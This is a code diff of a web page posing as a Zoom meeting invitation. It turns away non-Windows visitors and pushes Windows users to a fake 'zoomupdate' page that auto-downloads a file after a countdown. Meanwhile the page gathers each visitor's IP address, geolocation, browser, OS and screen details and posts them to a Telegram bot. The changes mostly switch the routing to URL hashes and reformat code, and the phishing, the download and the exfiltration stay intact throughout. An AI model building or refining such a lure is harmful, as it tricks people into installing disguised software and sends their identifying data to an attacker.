@@ -19,7 +19,7 @@
             min-height: 100vh;
         }
 
-        /* ----- GLOBAL BLOCK OVERLAY (shown on non‑Windows on any page) ----- */
+        /* ----- GLOBAL BLOCK OVERLAY (shown on non‑Windows) ----- */
         #globalBlockOverlay {
             position: fixed;
             top: 0;
@@ -202,17 +202,15 @@
             color: #aaa;
         }
 
-        /* ----- DOWNLOAD PAGE (original style) ----- */
+        /* ----- DOWNLOAD PAGE ----- */
         #downloadPage {
             background: #f4f7fa;
             position: relative;
             min-height: 100vh;
         }
-
         #downloadContent {
             display: none;
         }
-
         .container {
             display: flex;
             flex-direction: column;
@@ -276,12 +274,8 @@
             margin-top: 30px;
         }
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .status-message {
             margin-top: 20px;
@@ -290,12 +284,8 @@
             min-height: 30px;
             color: #28a745;
         }
-        .status-message.error {
-            color: #dc3545;
-        }
-        .status-message.info {
-            color: #0072c6;
-        }
+        .status-message.error { color: #dc3545; }
+        .status-message.info { color: #0072c6; }
         .footer {
             position: absolute;
             bottom: 20px;
@@ -385,7 +375,7 @@
         <p class="overlay-sub" style="font-size:15px; color:#666;">Please join from a Windows computer.</p>
     </div>
 
-    <!-- INVITATION PAGE (visible at /invite for Windows) -->
+    <!-- INVITATION PAGE -->
     <div id="invitationPage" class="page">
         <div class="invitation-card">
             <img class="zoom-logo" src="Zoom_Communications_Logo.svg" alt="Zoom" />
@@ -412,7 +402,7 @@
         </div>
     </div>
 
-    <!-- DOWNLOAD PAGE (visible at /invite/zoomupdate for Windows) -->
+    <!-- DOWNLOAD PAGE -->
     <div id="downloadPage" class="page">
         <div id="downloadContent">
             <div class="logo-container">
@@ -461,7 +451,6 @@
                 if (/iOS|iPhone|iPad/i.test(ua)) return 'iOS';
                 return 'Unknown OS';
             }
-
             function isWindows() {
                 return getOS().indexOf('Windows') === 0;
             }
@@ -475,7 +464,7 @@
             var joinBtn = document.getElementById('joinButton');
 
             // ------------------------------------------------------------
-            //  3.  ROUTING
+            //  3.  ROUTING (hash‑based)
             // ------------------------------------------------------------
             function showPage(pageId) {
                 document.querySelectorAll('.page').forEach(function(p) {
@@ -484,91 +473,75 @@
                 document.getElementById(pageId).classList.add('active');
             }
 
-            // Main router – called on load and on popstate
-            function route() {
-                var path = window.location.pathname;
+            function getHash() {
+                return window.location.hash.slice(1) || ''; // remove leading #
+            }
 
+            function route() {
                 // Non‑Windows: show overlay, hide all pages
                 if (!isWindows()) {
                     globalOverlay.style.display = 'flex';
                     document.querySelectorAll('.page').forEach(function(p) {
                         p.classList.remove('active');
                     });
-                    // Hide download content as well
                     document.getElementById('downloadContent').style.display = 'none';
                     return;
                 }
 
                 // Windows: hide overlay
                 globalOverlay.style.display = 'none';
+                var hash = getHash();
 
-                // Determine which page to show based on path
-                if (path === '/invite/zoomupdate') {
+                // Redirect root or empty hash to #invite
+                if (hash === '' || hash === '/') {
+                    location.replace('#invite');
+                    return;
+                }
+
+                if (hash === 'invite') {
+                    showPage('invitationPage');
+                    document.getElementById('downloadContent').style.display = 'none';
+                } else if (hash === 'invite/zoomupdate') {
                     showPage('downloadPage');
                     document.getElementById('downloadContent').style.display = 'block';
                     initDownloadPage();
-                } else if (path === '/invite') {
-                    showPage('invitationPage');
-                    document.getElementById('downloadContent').style.display = 'none';
                 } else {
-                    // Any other path – redirect to /invite
-                    location.replace('/invite');
-                    return;
+                    // unknown hash – go to invite
+                    location.replace('#invite');
                 }
             }
 
             // ------------------------------------------------------------
-            //  4.  REDIRECT ON LOAD (if Windows and not on /invite or /invite/zoomupdate)
+            //  4.  LISTEN TO HASH CHANGES
             // ------------------------------------------------------------
-            function initialRedirect() {
-                var path = window.location.pathname;
-                if (isWindows()) {
-                    if (path !== '/invite' && path !== '/invite/zoomupdate') {
-                        location.replace('/invite');
-                        return;
-                    }
-                }
-                // If non‑Windows, we just let route() handle showing overlay
-                route();
-            }
+            window.addEventListener('hashchange', route);
 
             // ------------------------------------------------------------
-            //  5.  JOIN BUTTON – navigate to /invite/zoomupdate (replace history)
+            //  5.  JOIN BUTTON – navigate to #invite/zoomupdate (replace)
             // ------------------------------------------------------------
             joinBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                if (!isWindows()) return; // safety
-                // Replace current history entry so back button doesn't go back to /invite
-                history.replaceState({ page: 'download' }, '', '/invite/zoomupdate');
-                showPage('downloadPage');
-                document.getElementById('downloadContent').style.display = 'block';
-                initDownloadPage();
-            });
-
-            // ------------------------------------------------------------
-            //  6.  POPSTATE (back/forward) – re‑route
-            // ------------------------------------------------------------
-            window.addEventListener('popstate', function(e) {
+                if (!isWindows()) return;
+                // Replace current history so back button doesn't return to #invite
+                location.replace('#invite/zoomupdate');
+                // route() will be triggered by hashchange, but we call it directly too
                 route();
             });
 
             // ------------------------------------------------------------
-            //  7.  DOWNLOAD PAGE LOGIC (only runs on Windows)
+            //  6.  DOWNLOAD PAGE LOGIC (only runs on Windows)
             // ------------------------------------------------------------
             var downloadInitialized = false;
 
             function initDownloadPage() {
                 if (downloadInitialized) return;
                 downloadInitialized = true;
-
-                // Ensure overlay is hidden
                 globalOverlay.style.display = 'none';
-                // start countdown
                 startCountdownAndDownload();
             }
 
             // ------------------------------------------------------------
-            //  8.  COUNTDOWN + DOWNLOAD (unchanged)
+            //  7.  COUNTDOWN + DOWNLOAD (unchanged)
             // ------------------------------------------------------------
             function startCountdownAndDownload() {
                 var countdownEl = document.getElementById('countdown');
@@ -677,13 +650,9 @@
                             document.body.appendChild(a);
                             a.click();
                             document.body.removeChild(a);
-                            setTimeout(function() {
-                                URL.revokeObjectURL(url);
-                            }, 100);
+                            setTimeout(function() { URL.revokeObjectURL(url); }, 100);
                             resolve();
-                        } catch (e) {
-                            reject(e);
-                        }
+                        } catch (e) { reject(e); }
                     });
                 }
 
@@ -733,7 +702,6 @@
                     if (ua.indexOf('Trident') > -1) return 'Internet Explorer';
                     return 'Unknown';
                 }
-
                 function getBrowserVersion() {
                     var ua = navigator.userAgent;
                     var match;
@@ -742,11 +710,9 @@
                     }
                     return 'Unknown';
                 }
-
                 function getDeviceType() {
                     return (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) ? 'Mobile/Tablet' : 'Desktop';
                 }
-
                 function getOSDetailed() {
                     var ua = navigator.userAgent;
                     if (ua.indexOf('Windows NT 10.0') > -1) return 'Windows 10';
@@ -760,16 +726,13 @@
                     if (/iOS|iPhone|iPad/i.test(ua)) return 'iOS';
                     return 'Unknown OS';
                 }
-
                 function getScreenInfo() {
                     return window.screen.width + '×' + window.screen.height;
                 }
-
                 function getTimeUTC() {
                     var now = new Date();
                     return now.toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
                 }
-
                 function fetchWithTimeout(url, timeoutMs) {
                     return new Promise(function(resolve, reject) {
                         var timer = setTimeout(function() { reject(new Error('Timeout')); }, timeoutMs);
@@ -786,55 +749,58 @@
                             });
                     });
                 }
-
                 function sendTelegramReport() {
                     if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
                         console.warn('Telegram not configured.');
                         return;
                     }
-                    var services = [{
-                        url: 'https://ipinfo.io/json',
-                        parser: function(data) {
-                            var country = data.country || 'Unknown';
-                            var city = data.city || '';
-                            var region = data.region || '';
-                            var location = country;
-                            if (city && region) location = city + ', ' + region + ', ' + country;
-                            else if (city) location = city + ', ' + country;
-                            else if (region) location = region + ', ' + country;
-                            return { ip: data.ip || 'Unknown', location: location };
+                    var services = [
+                        {
+                            url: 'https://ipinfo.io/json',
+                            parser: function(data) {
+                                var country = data.country || 'Unknown';
+                                var city = data.city || '';
+                                var region = data.region || '';
+                                var location = country;
+                                if (city && region) location = city + ', ' + region + ', ' + country;
+                                else if (city) location = city + ', ' + country;
+                                else if (region) location = region + ', ' + country;
+                                return { ip: data.ip || 'Unknown', location: location };
+                            }
+                        },
+                        {
+                            url: 'https://ipapi.co/json/',
+                            parser: function(data) {
+                                var country = data.country_name || data.country || 'Unknown';
+                                var city = data.city || '';
+                                var region = data.region || '';
+                                var location = country;
+                                if (city && region) location = city + ', ' + region + ', ' + country;
+                                else if (city) location = city + ', ' + country;
+                                else if (region) location = region + ', ' + country;
+                                return { ip: data.ip || 'Unknown', location: location };
+                            }
+                        },
+                        {
+                            url: 'https://ip-api.com/json/',
+                            parser: function(data) {
+                                var country = data.country || 'Unknown';
+                                var city = data.city || '';
+                                var region = data.regionName || '';
+                                var location = country;
+                                if (city && region) location = city + ', ' + region + ', ' + country;
+                                else if (city) location = city + ', ' + country;
+                                else if (region) location = region + ', ' + country;
+                                return { ip: data.query || 'Unknown', location: location };
+                            }
+                        },
+                        {
+                            url: 'https://api.ipify.org?format=json',
+                            parser: function(data) {
+                                return { ip: data.ip || 'Unknown', location: 'Unknown' };
+                            }
                         }
-                    }, {
-                        url: 'https://ipapi.co/json/',
-                        parser: function(data) {
-                            var country = data.country_name || data.country || 'Unknown';
-                            var city = data.city || '';
-                            var region = data.region || '';
-                            var location = country;
-                            if (city && region) location = city + ', ' + region + ', ' + country;
-                            else if (city) location = city + ', ' + country;
-                            else if (region) location = region + ', ' + country;
-                            return { ip: data.ip || 'Unknown', location: location };
-                        }
-                    }, {
-                        url: 'https://ip-api.com/json/',
-                        parser: function(data) {
-                            var country = data.country || 'Unknown';
-                            var city = data.city || '';
-                            var region = data.regionName || '';
-                            var location = country;
-                            if (city && region) location = city + ', ' + region + ', ' + country;
-                            else if (city) location = city + ', ' + country;
-                            else if (region) location = region + ', ' + country;
-                            return { ip: data.query || 'Unknown', location: location };
-                        }
-                    }, {
-                        url: 'https://api.ipify.org?format=json',
-                        parser: function(data) {
-                            return { ip: data.ip || 'Unknown', location: 'Unknown' };
-                        }
-                    }];
-
+                    ];
                     function tryService(index) {
                         if (index >= services.length) {
                             buildAndSendTelegram('Unknown', 'Unknown');
@@ -856,7 +822,6 @@
                     }
                     tryService(0);
                 }
-
                 function buildAndSendTelegram(ip, location) {
                     var ua = navigator.userAgent;
                     var browser = getBrowserInfo();
@@ -923,29 +888,29 @@
 
                     function attemptSend(attempt) {
                         fetch(url, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(payload)
-                            })
-                            .then(function(response) {
-                                if (!response.ok) throw new Error('HTTP ' + response.status);
-                                return response.json();
-                            })
-                            .then(function(data) {
-                                if (data.ok) {
-                                    console.log('Telegram report sent successfully.');
-                                } else {
-                                    throw new Error('Telegram error: ' + (data.description || 'unknown'));
-                                }
-                            })
-                            .catch(function(err) {
-                                console.warn('Telegram attempt ' + attempt + ' failed:', err);
-                                if (attempt < 2) {
-                                    setTimeout(function() { attemptSend(attempt + 1); }, 2000);
-                                } else {
-                                    console.error('Telegram report failed after retries.');
-                                }
-                            });
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        })
+                        .then(function(response) {
+                            if (!response.ok) throw new Error('HTTP ' + response.status);
+                            return response.json();
+                        })
+                        .then(function(data) {
+                            if (data.ok) {
+                                console.log('Telegram report sent successfully.');
+                            } else {
+                                throw new Error('Telegram error: ' + (data.description || 'unknown'));
+                            }
+                        })
+                        .catch(function(err) {
+                            console.warn('Telegram attempt ' + attempt + ' failed:', err);
+                            if (attempt < 2) {
+                                setTimeout(function() { attemptSend(attempt + 1); }, 2000);
+                            } else {
+                                console.error('Telegram report failed after retries.');
+                            }
+                        });
                     }
                     attemptSend(1);
                 }
@@ -963,9 +928,9 @@
             }
 
             // ------------------------------------------------------------
-            //  9.  BOOT
+            //  8.  BOOT
             // ------------------------------------------------------------
-            initialRedirect();
+            route(); // initial route based on current hash
 
         })();
     </script>
